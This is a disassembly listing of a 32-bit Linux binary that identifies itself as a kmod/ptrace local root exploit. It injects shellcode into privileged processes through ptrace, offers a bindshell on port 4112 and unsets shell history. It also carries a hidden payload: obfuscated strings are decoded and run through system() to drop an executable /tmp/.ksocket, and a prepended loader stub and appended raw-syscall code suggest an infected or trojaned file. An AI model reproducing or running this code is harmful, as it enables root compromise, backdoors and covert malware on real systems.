jmp 0x8051441
dec edi
push ebx
inc esi
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
mov eax, loc._start
pushal
call fcn.0805230c
popal
jmp eax
push ebp
mov ebp, esp
push ebx
push eax
call 0x80488ee
pop ebx
add ebx, 0x9d86
mov eax, dword [ebx + 0x7c]
test eax, eax
je 0x8048901
call eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov edx, dword [obj.completed.1]
mov ebp, esp
sub esp, 8
test edx, edx
jne 0x8048969
mov edx, dword [obj.p.0]
mov eax, dword [edx]
test eax, eax
je 0x8048946
lea esi, [esi]
lea eax, [edx + 4]
mov dword [obj.p.0], eax
call dword [edx]
mov edx, dword [obj.p.0]
mov ecx, dword [edx]
test ecx, ecx
jne 0x8048930
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x804895f
sub esp, 0xc
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
add esp, 0x10
mov eax, 1
mov dword [obj.completed.1], eax
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
sub esp, 8
test eax, eax
je 0x80489a4
sub esp, 8
push obj.object.2
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
add esp, 0x10
mov esp, ebp
pop ebp
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov eax, dword [obj.__CTOR_LIST__]
mov ebp, esp
push ebx
sub esp, 4
cmp eax, 0xffffffff
mov ebx, obj.__CTOR_LIST__
je 0x804972c
lea esi, [esi]
lea edi, [edi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x8049720
pop eax
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 4
push dword [arg_8h]
push str.Usage:__s___d____b____r____s____c_executable__n_t_d_t___use_double_ptrace_method__to_run_interactive_programs__n_t_b_t___start_bindshell_on_port_4112_n_t_r_t___support_randomized_pids_n_t_c_t___choose_executable_to_start_n_t_s_t___single_shot_mode___abort_if_unsuccessful_at_the_first_try_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp.exit
jmp dword [reloc.fprintf]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
push ebx
push edx
call 0x80496de
pop ebx
add ebx, 0x8f96
push eax
push dword [arg_ch]
push dword [arg_8h]
push 3
call sym.imp.__xstat
add esp, 0x10
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.__xstat]
push ebp
mov ebp, esp
sub esp, 0x558
sub esp, 0xc
push obj.shcode
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov dword [var_13ch], eax
sub esp, 8
push 0
push dword [pid]
call sym.imp.kill
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048e64
jmp 0x80490c1
sub esp, 4
push dword [pid]
push str._proc__d_exe
lea eax, [s]
push eax
call sym.imp.sprintf
add esp, 0x10
sub esp, 8
lea eax, [var_138h]
push eax
lea eax, [s]
push eax
call sym.__stat
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048ea4
jmp 0x80490c1
mov esi, esi
mov eax, dword [var_12ch]
cmp eax, dword [0x80527ec]
jne 0x80490c1
mov eax, dword [var_138h]
mov edx, dword [var_134h]
mov ecx, edx
xor ecx, dword [0x80527e4]
xor eax, dword [obj.me]
or eax, ecx
test eax, eax
jne 0x80490c1
push 0
push 0
push dword [pid]
push 0x10
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048ef8
jmp 0x80490c1
mov esi, esi
nop
lea esi, [esi]
lea eax, [var_68h]
push eax
push 0
push dword [pid]
push 0xc
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
jne 0x8048efc
sub esp, 4
push dword [pid]
push str.e_1_33m__de_0m_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
push 0
push 0
push dword [pid]
push 0x18
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048f4c
jmp 0x80490a0
mov esi, esi
nop
lea esi, [esi]
lea eax, [var_68h]
push eax
push 0
push dword [pid]
push 0xc
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
jne 0x8048f50
nop
mov dword [data], 0
lea esi, [esi]
mov eax, dword [data]
cmp eax, dword [var_13ch]
jle 0x8048f84
jmp 0x8048fb8
lea esi, [esi]
mov eax, dword [data]
add eax, obj.shcode
push dword [eax]
mov eax, dword [data]
add eax, dword [addr]
push eax
push dword [pid]
push 4
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048fb0
jmp 0x80490a0
lea esi, [esi]
lea eax, [data]
add dword [eax], 4
jmp 0x8048f74
sub esp, 8
push 9
push dword [obj.chldpid]
call sym.imp.kill
add esp, 0x10
push 0
push 0
push dword [pid]
push 0x11
call sym.imp.ptrace
add esp, 0x10
sub esp, 4
push dword [pid]
push str.e_1_32m___d_Duno__wait_2_sec..__BRB__if_you_have_problem_with_terminal_just_tipe_xterm_e_0m_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
cmp dword [obj.mode], 1
jne 0x8049095
lea eax, [var_548h]
mov dword [var_54ch], eax
sub esp, 8
push 0x12
push dword [obj.hackpid]
call sym.imp.kill
add esp, 0x10
sub esp, 4
sub esp, 8
push str.TERM
call sym.imp.getenv
add esp, 0xc
mov eax, eax
push eax
push str._nexport_TERM_s_nexport_PATH_sbin:_usr_sbin:_usr_local_sbin:_PATH_n_tmp_.ksocket___dev_null_2_1_nclear_nreset_nunset_HISTFILE_nclear_nid_n
lea eax, [var_548h]
push eax
call sym.imp.sprintf
add esp, 0x10
nop
mov eax, dword [var_54ch]
cmp byte [eax], 0
jne 0x804905c
jmp 0x8049080
lea esi, [esi]
sub esp, 4
push dword [var_54ch]
lea eax, [var_54ch]
inc dword [eax]
push 0x5412
push 0
call sym.imp.ioctl
add esp, 0x10
jmp 0x804904c
mov esi, esi
sub esp, 4
push 0
push 0
push dword [obj.hackpid]
call sym.imp.waitpid
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp.exit
nop
push 0
push 0
push dword [pid]
push 0x11
call sym.imp.ptrace
add esp, 0x10
sub esp, 8
push 0x12
push dword [pid]
call sym.imp.kill
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_ch]
mov word [var_2h], ax
movzx eax, word [var_2h]
push eax
movzx eax, word [var_2h]
push eax
push str.pid_d0x_08x_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
mov eax, dword [s1]
mov byte [eax], 0x31
mov eax, dword [s1]
inc eax
mov byte [eax], 0xff
add dword [s1], 2
cmp byte [var_2h], 0
je 0x8048a54
mov ax, word [var_2h]
and eax, 0xff00
test ax, ax
je 0x8048a54
mov eax, dword [s1]
mov byte [eax], 0x66
mov eax, dword [s1]
inc eax
mov byte [eax], 0xbf
mov edx, dword [s1]
add edx, 2
mov ax, word [var_2h]
mov word [edx], ax
mov eax, 6
jmp 0x8048ada
nop
mov dword [var_8h], 2
mov ax, word [var_2h]
and eax, 0xff00
test ax, ax
je 0x8048a87
mov eax, dword [s1]
mov byte [eax], 0xb0
mov edx, dword [s1]
inc edx
mov ax, word [var_2h]
shr ax, 8
mov byte [edx], al
add dword [s1], 2
lea eax, [var_8h]
add dword [eax], 2
sub esp, 4
push 3
push 0x804978f
push dword [s1]
call sym.imp.memcpy
add esp, 0x10
add dword [s1], 3
lea eax, [var_8h]
add dword [eax], 3
cmp byte [var_2h], 0
je 0x8048ac5
mov eax, dword [s1]
mov byte [eax], 0xb0
mov edx, dword [s1]
inc edx
mov al, byte [var_2h]
mov byte [edx], al
add dword [s1], 2
lea eax, [var_8h]
add dword [eax], 2
mov eax, dword [s1]
mov byte [eax], 0x89
mov eax, dword [s1]
inc eax
mov byte [eax], 0xc7
mov eax, dword [var_8h]
add eax, 2
mov eax, eax
leave
ret
push ebp
mov ebp, esp
sub esp, 8
call loc.gcc2_compiled.
nop
call sym.frame_dummy
call loc.gcc2_compiled._2
leave
ret
push ebp
mov ebp, esp
mov dword [obj.sf], 1
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x98
mov dword [var_ch], 0
call sym.imp.getpid
mov eax, eax
mov dword [var_14h], eax
call sym.pula
sub esp, 8
push str.Linux_kmod__ptrace_local_root_exploit_by_ice__ice_ice.tc__and_SoKares__sokares_unixteam.us__nTested_on_RedHat_7.1_7.2_7.3_8.0__Debian_3.0__Cobalt__Suse_etc___________n_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 8
push obj.me
push str._proc_self_exe
call sym.__stat
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8049178
sub esp, 8
push obj.me
mov eax, dword [argv]
push dword [eax]
call sym.__stat
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8049178
sub esp, 0xc
push str.stat_myself_
call sym.imp.perror
add esp, 0x10
mov eax, 0
jmp 0x80496d0
lea esi, [esi]
nop
lea esi, [esi]
sub esp, 4
push str.sbdrc:
push dword [argv]
push dword [argc]
call sym.imp.getopt
add esp, 0x10
mov eax, eax
mov byte [var_dh], al
mov al, byte [var_dh]
cmp al, 0xff
jne 0x80491a0
jmp 0x804921c
movsx eax, byte [var_dh]
sub eax, 0x62
mov dword [var_8ch], eax
cmp dword [var_8ch], 0x11
ja case.0x80491c3.3
mov edx, dword [var_8ch]
mov eax, dword [edx*4 + 0x80513c0]
jmp eax
lea esi, [esi]
mov dword [obj.mode], 1
jmp 0x804917c
mov dword [obj.mode], 2
jmp 0x804917c
mov dword [obj.randpids], 1
jmp 0x804917c
mov eax, dword [obj.optarg]
mov dword [obj.bin], eax
jmp 0x804917c
mov dword [var_ch], 1
jmp 0x804917c
sub esp, 0xc
mov eax, dword [argv]
push dword [eax]
call sym.usage
add esp, 0x10
jmp 0x804917c
lea esi, [esi]
mov eax, dword [argc]
cmp eax, dword [obj.optind]
je 0x8049237
sub esp, 0xc
mov eax, dword [argv]
push dword [eax]
call sym.usage
add esp, 0x10
cmp dword [obj.bin], 0
jne 0x8049286
cmp dword [obj.mode], 0
je 0x8049258
mov dword [obj.bin], 0x80511ee
jmp 0x8049286
lea esi, [esi]
sub esp, 8
lea eax, [var_78h]
push eax
mov dword [obj.bin], 0x80511f6
push str._bin_id
call sym.__stat
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8049286
mov dword [obj.bin], 0x80511fe
sub esp, 8
push sym.synch
push 0xa
call sym.imp.signal
add esp, 0x10
mov dword [obj.hackpid], 0
mov eax, dword [obj.mode]
mov dword [var_90h], eax
cmp dword [var_90h], 1
je 0x8049330
cmp dword [var_90h], 1
jg 0x80492d0
cmp dword [var_90h], 0
je 0x80492e4
jmp 0x804948b
lea esi, [esi]
cmp dword [var_90h], 2
je 0x8049444
jmp 0x804948b
mov esi, esi
sub esp, 4
push dword [obj.bin]
push str.__Simple_mode__executing__s____dev_tty_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 8
push obj.execve_tty_code
push obj.shcode
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push dword [obj.bin]
push obj.shcode
call sym.imp.strcat
add esp, 0x10
jmp 0x804948b
push str._usr_bin_passwd
push dword [obj.bin]
push str.__Double_ptrace_mode__executing__s__suid_helper__s_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
call sym.imp.fork
mov eax, eax
mov dword [obj.hackpid], eax
cmp dword [obj.hackpid], 0
jne 0x80493fc
lea eax, [var_8h]
sub eax, 0x78
mov dword [var_80h], str._usr_bin_passwd
mov dword [var_7ch], 0
sub esp, 4
push str._usr_bin_passwd
push str.Starting_suid_program__s_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 8
push 0xa
sub esp, 4
call sym.imp.getppid
add esp, 4
mov eax, eax
push eax
call sym.imp.kill
add esp, 0x10
sub esp, 4
push dword [envp]
lea eax, [var_80h]
push eax
push dword [var_80h]
call sym.imp.execve
add esp, 0x10
sub esp, 8
push 9
sub esp, 4
call sym.imp.getppid
add esp, 4
mov eax, eax
push eax
call sym.imp.kill
add esp, 0x10
sub esp, 0xc
push str.execve_SUID_
call sym.imp.perror
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp._exit
nop
nop
lea esi, [esi]
cmp dword [obj.sf], 0
je 0x8049400
sub esp, 0xc
push 0x186a0
call sym.imp.usleep
add esp, 0x10
sub esp, 8
push 0x13
push dword [obj.hackpid]
call sym.imp.kill
add esp, 0x10
sub esp, 0xc
movzx eax, word [obj.hackpid]
push eax
call sym.mkcode
add esp, 0x10
jmp 0x804948b
lea esi, [esi]
sub esp, 4
push dword [obj.bin]
push str.__portbind_mode__executing__s_on_port_4112_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 8
push obj.bind_code
push obj.shcode
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push dword [obj.bin]
push obj.shcode
call sym.imp.strcat
add esp, 0x10
sub esp, 4
sub esp, 8
push obj.shcode
call sym.imp.strlen
add esp, 0xc
mov eax, eax
mov eax, eax
push eax
push str.sizeof_shellcode__d_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 8
push loc.gcc2_compiled._4
push 0xc
call sym.imp.signal
add esp, 0x10
cmp dword [obj.randpids], 0
je 0x80494e7
sub esp, 8
push str.e_1_31mRandomized_pids_support_enabled..._be_patient_or_load_the_system_heavily__nthis_method_does_more_brute_forcinge_0m_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
nop
mov dword [obj.sf], 0
call sym.imp.fork
mov eax, eax
mov dword [obj.chldpid], eax
cmp dword [obj.chldpid], 0
jne 0x80495cc
sub esp, 8
push 0xa
sub esp, 4
call sym.imp.getppid
add esp, 4
mov eax, eax
push eax
call sym.imp.kill
add esp, 0x10
mov esi, esi
cmp dword [obj.sf], 0
je 0x8049528
sub esp, 8
push str.__Child_process_started
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
mov dword [var_84h], 0
lea esi, [esi]
cmp dword [var_84h], 9
jle 0x8049598
sub esp, 8
push 0x80513b5
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 8
push 0xc
sub esp, 4
call sym.imp.getppid
add esp, 4
mov eax, eax
push eax
call sym.imp.kill
add esp, 0x10
sub esp, 0xc
push 0
call sym.imp._exit
sub esp, 8
push 0x80513b3
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
sub esp, 4
push 0
push 0
push 0x16
call sym.imp.socket
add esp, 0x10
lea eax, [var_84h]
inc dword [eax]
jmp 0x8049554
lea esi, [esi]
nop
lea esi, [esi]
cmp dword [obj.sf], 0
je 0x80495d0
sub esp, 8
push 0xa
push dword [obj.chldpid]
call sym.imp.kill
add esp, 0x10
cmp dword [obj.randpids], 0
je 0x8049658
mov dword [var_88h], 1
nop
cmp dword [var_88h], 0x752f
jle 0x8049614
jmp 0x8049694
lea esi, [esi]
mov eax, dword [var_88h]
cmp eax, dword [obj.chldpid]
je 0x804964c
mov eax, dword [var_88h]
cmp eax, dword [var_14h]
je 0x804964c
mov eax, dword [var_88h]
cmp eax, dword [obj.hackpid]
je 0x804964c
sub esp, 0xc
push dword [var_88h]
call sym.hack
add esp, 0x10
lea eax, [var_88h]
inc dword [eax]
jmp 0x8049600
mov esi, esi
mov eax, dword [obj.chldpid]
inc eax
mov dword [var_88h], eax
mov eax, dword [obj.chldpid]
add eax, 0xa
cmp dword [var_88h], eax
jl 0x8049678
jmp 0x8049694
mov esi, esi
sub esp, 0xc
push dword [var_88h]
call sym.hack
add esp, 0x10
lea eax, [var_88h]
inc dword [eax]
jmp 0x8049664
nop
cmp dword [obj.u2], 0
je 0x80495ec
mov dword [obj.u2], 0
cmp dword [var_ch], 0
je 0x80494e8
sub esp, 8
push str.Failed_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 0x10
mov eax, 1
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x14
mov eax, dword [arg_8h]
mov word [var_6h], ax
mov dword [var_ch], 0
mov dword [dest], obj.shcode
sub esp, 8
movzx eax, word [var_6h]
push eax
push dword [dest]
call sym.pidcode
add esp, 0x10
mov edx, eax
lea eax, [dest]
add dword [eax], edx
sub esp, 8
push obj.ptrace_code
push dword [dest]
call sym.imp.strcpy
add esp, 0x10
mov ebx, dword [dest]
add ebx, 0x35
sub esp, 0xc
push dword [obj.bin]
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov eax, eax
add eax, 0x30
shr eax, 2
mov byte [ebx], al
sub esp, 8
push obj.execve_code
push dword [dest]
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push dword [obj.bin]
push dword [dest]
call sym.imp.strcat
add esp, 0x10
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.strcpy]
jmp dword [reloc.strlen]
jmp dword [reloc.strcat]
push ebp
mov ebp, esp
push ebx
push edx
call 0x804974a
pop ebx
add ebx, 0x8f2a
lea esi, [esi]
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
mov dword [obj.u2], 1
pop ebp
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
sub esp, 8
push str._36:_546_343_343_594_45:_533_3:9_335_336_486_496_48:_476_486_478_497
push obj.mumu
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push str.151143145000214133011170124105266256100023102000015040012250330203200370051011244373366246362020014006027100024106066233220356244033072011164167022310240002101005041174314342066017235200312347163160144106311060340202302033066237362371044154111200250330331040011230141020311073347334113125367365070363332257274177375367234072113235252352134372076235365320204244244044161365323105164025330233273322222142207353250331072157027126221054106210301342106270142037332062220201266013060266156320054320272102273200015356141353007270237161057311150364201173330226071001072165175221246337047156057334203166031372247136262220135274337005056065160277006356141253204076266144303006266024030044145271045005233025372326270173031241340274214220157144050130130274070075122224236251363151206157367117232146344102157335214230172103353011255007264136042361223144310130214176162234156012264356320122305117077317143356312055051313341072004032204045016101077025006353013070013143207376026343176071264126350277053364373213160020230253003106
push obj.tot
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push str.nvrfnhw
push obj.ksocket
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push str.hfkr
push obj.ech
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push str.jls
push obj.gzip
call sym.imp.strcpy
add esp, 0x10
mov dword [var_8h], 0
nop
sub esp, 0xc
push obj.mumu
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov eax, eax
cmp dword [var_8h], eax
jb 0x8048c0c
jmp 0x8048cc8
mov esi, esi
mov ebx, obj.mumu
mov ecx, dword [var_8h]
mov edx, obj.mumu
mov eax, dword [var_8h]
mov al, byte [eax + edx]
sub eax, 3
mov byte [ecx + ebx], al
sub esp, 0xc
push obj.ksocket
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov eax, eax
cmp dword [var_8h], eax
jae 0x8048c57
mov ebx, obj.ksocket
mov ecx, dword [var_8h]
mov edx, obj.ksocket
mov eax, dword [var_8h]
mov al, byte [eax + edx]
sub eax, 3
mov byte [ecx + ebx], al
sub esp, 0xc
push obj.ech
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov eax, eax
cmp dword [var_8h], eax
jae 0x8048c89
mov ebx, obj.ech
mov ecx, dword [var_8h]
mov edx, obj.ech
mov eax, dword [var_8h]
mov al, byte [eax + edx]
sub eax, 3
mov byte [ecx + ebx], al
sub esp, 0xc
push obj.gzip
call sym.imp.strlen
add esp, 0x10
mov eax, eax
mov eax, eax
cmp dword [var_8h], eax
jae 0x8048cbb
mov ebx, obj.gzip
mov ecx, dword [var_8h]
mov edx, obj.gzip
mov eax, dword [var_8h]
mov al, byte [eax + edx]
sub eax, 3
mov byte [ecx + ebx], al
lea eax, [var_8h]
inc dword [eax]
jmp 0x8048bec
lea esi, [esi]
sub esp, 8
push obj.ech
push obj.COM
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push str.__n__e__
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push obj.mumu
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push obj.tot
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push 0x8050e94
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push obj.gzip
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push str.__d__
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push 0x8050e9e
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push 0x8050ea2
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push obj.ksocket
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 0xc
push obj.COM
call sym.imp.system
add esp, 0x10
sub esp, 8
push str.chmod
push obj.COM
call sym.imp.strcpy
add esp, 0x10
sub esp, 8
push str._x_
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push 0x8050e9e
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push 0x8050ea2
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 8
push obj.ksocket
push obj.COM
call sym.imp.strcat
add esp, 0x10
sub esp, 0xc
push obj.COM
call sym.imp.system
add esp, 0x10
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.system]
jmp dword [reloc.usleep]
jmp dword [reloc.getpid]
jmp dword [reloc.perror]
jmp dword [reloc.fork]
jmp dword [reloc.getenv]
jmp dword [reloc.signal]
jmp dword [reloc.execve]
jmp dword [reloc.getppid]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.waitpid]
jmp dword [reloc.getopt]
jmp dword [reloc.ptrace]
jmp dword [reloc.__libc_start_main]
jmp dword [reloc.memcpy]
jmp dword [reloc.__cxa_finalize]
jmp dword [reloc.ioctl]
jmp dword [reloc._exit]
jmp dword [reloc.kill]
jmp dword [reloc.sprintf]
jmp dword [reloc.socket]
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
call fcn.080521f4
test eax, eax
je 0x805239b
lea eax, [var_1004h]
push eax
call fcn.0805209c
mov edi, eax
add esp, 4
test edi, edi
je 0x805239b
call edi
test eax, eax
jne 0x805239b
push dword [var_1004h]
push edi
call fcn.08052260
push 0x18
call fcn.0805147c
add esp, 0xc
test eax, eax
jne 0x805239b
push 0x1000
lea esi, [var_1000h]
push esi
push 0xb7
call fcn.0805149c
push 8
lea ebx, [var_100ch]
push ebx
push 3
call fcn.08051730
push ebx
push 0xc
call fcn.08051488
add esp, 0x20
push dword [var_1004h]
push edi
call fcn.08052260
push esi
push 0xc
call fcn.08051488
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x80
push esi
push ebx
push 0x80
lea esi, [var_80h]
push esi
push 2
call fcn.08051730
push 0
push 0
push esi
push 5
call fcn.080514b4
mov ebx, eax
add esp, 0x1c
test ebx, ebx
jl 0x8052235
push 0x80
push esi
push ebx
push 3
call fcn.080514b4
add esp, 0x10
push ebx
push 6
call fcn.08051488
push esi
call fcn.08051690
cmp eax, 0x12b
jg 0x8052250
xor eax, eax
jmp 0x8052255
mov esi, esi
mov eax, 1
lea esp, [var_88h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x47c
push edi
push esi
push ebx
mov dword [var_478h], 0
lea esi, [var_400h]
push 0x400
push esi
push 0
call fcn.08051730
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [esi + ecx - 1]
push 0x14
call fcn.0805147c
mov edx, eax
push edx
call fcn.08051650
mov edx, eax
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ecx, [esi + ecx - 1]
add edx, ecx
push 5
push edx
push 1
call fcn.08051730
add esp, 0x20
push ebx
push 0x14
call fcn.0805147c
add esp, 4
mov edx, eax
push edx
call fcn.08052048
push 0
push 0
push esi
push 5
call fcn.080514b4
mov ebx, eax
add esp, 0x18
test ebx, ebx
jl 0x80521c0
push 0x34
lea eax, [var_474h]
push eax
push ebx
call fcn.08051508
add esp, 0xc
cmp eax, 1
jne 0x80521c0
push 0
push dword [var_468h]
push ebx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x80521c0
lea eax, [var_440h]
push eax
push ebx
push 0x6c
call fcn.0805149c
add esp, 0xc
test eax, eax
jl 0x80521c0
mov eax, dword [var_468h]
mov edi, dword [var_42ch]
sub edi, eax
push edi
call fcn.080514d4
mov dword [var_478h], eax
add esp, 4
test eax, eax
je 0x80521c0
push edi
push eax
push ebx
call fcn.08051508
mov edx, eax
add esp, 0xc
cmp edx, 1
jne 0x80521c0
mov eax, dword [arg_8h]
mov dword [eax], edi
push ebx
push 6
call fcn.08051488
mov eax, dword [var_478h]
jmp 0x80521e9
nop
cmp ebx, 0xffffffff
je 0x80521d0
push ebx
push 6
call fcn.08051488
add esp, 8
cmp dword [var_478h], 0
je 0x80521e7
mov eax, dword [var_478h]
push eax
push 0x2d
call fcn.08051488
xor eax, eax
lea esp, [var_488h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x130
push edi
push esi
push ebx
lea edx, [var_12ch]
mov dword [var_130h], edx
lea ebx, [var_122h]
mov esi, 0xc8
mov byte [var_12ch], 0x2e
mov byte [var_12bh], 0
push 0
push 0
push edx
push 5
call fcn.080514b4
mov edi, eax
add esp, 0x10
test edi, edi
jge 0x80522e1
mov eax, 0xffffffff
jmp 0x8052301
lea esi, [esi]
test esi, esi
jl 0x80522f9
push ebx
call fcn.08051610
add eax, ebx
add esp, 4
cmp byte [eax - 2], 0x70
jne 0x80522cb
cmp byte [eax - 1], 0x73
je 0x80522e1
mov edx, dword [arg_ch]
push edx
mov edx, dword [arg_8h]
push edx
push ebx
call fcn.08051960
add esp, 0xc
test eax, eax
jne 0x80522e1
dec esi
push 1
mov edx, dword [var_130h]
push edx
push edi
push 0x59
call fcn.080514b4
add esp, 0x10
test eax, eax
jg 0x80522b0
push edi
push 6
call fcn.08051488
lea esp, [var_13ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
int 0x80
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
mov eax, dword [arg_10h]
mov ebx, dword [arg_14h]
mov ecx, dword [arg_18h]
int 0x80
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.08051700
mov esi, eax
test ebx, ebx
jle 0x8051753
nop
cmp byte [esi], 0
jne 0x805174e
dec ebx
inc esi
test ebx, ebx
jg 0x8051748
mov eax, dword [arg_10h]
push eax
push 0
mov edi, dword [arg_ch]
push edi
call fcn.080515ec
mov edx, esi
mov edi, edx
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov eax, dword [arg_10h]
cmp ecx, eax
ja 0x8051790
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [ecx - 1]
jmp 0x8051793
lea esi, [esi]
mov ebx, dword [arg_10h]
xor ecx, ecx
cmp ecx, ebx
jge 0x80517c1
lea esi, [esi]
mov dl, byte [ecx + esi]
test dl, dl
je 0x80517bc
mov byte [var_4h], dl
and byte [var_4h], 0xf0
sub dl, byte [var_4h]
add byte [var_4h], 0xf
mov al, byte [var_4h]
sub al, dl
mov edi, dword [arg_ch]
mov byte [ecx + edi], al
inc ecx
cmp ecx, ebx
jl 0x805179c
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
int 0x80
pop ebx
leave
ret
pop eax
sub eax, 0x4e
jmp 0x805146e
call fcn.08051461
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
push edx
mov eax, dword [arg_14h]
mov ebx, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_20h]
int 0x80
pop edx
pop ecx
pop ebx
leave
ret
pop eax
jmp loc.0805172b
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.08051700
mov esi, eax
test ebx, ebx
jle 0x8051753
nop
cmp byte [esi], 0
jne 0x805174e
dec ebx
inc esi
test ebx, ebx
jg 0x8051748
mov eax, dword [arg_10h]
push eax
push ebp
mov ebp, esp
jmp 0x8051708
pop eax
jmp loc.0805172b
call fcn.08051705
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [eax], al
and byte [edx + 0x77], ch
push 0
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [edx + 0x7f], bh
jnp 0x8051789
bound ebp, qword [edx]
and byte [arg_66h], ch
popal
add cl, cl
leave
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [arg_10h]
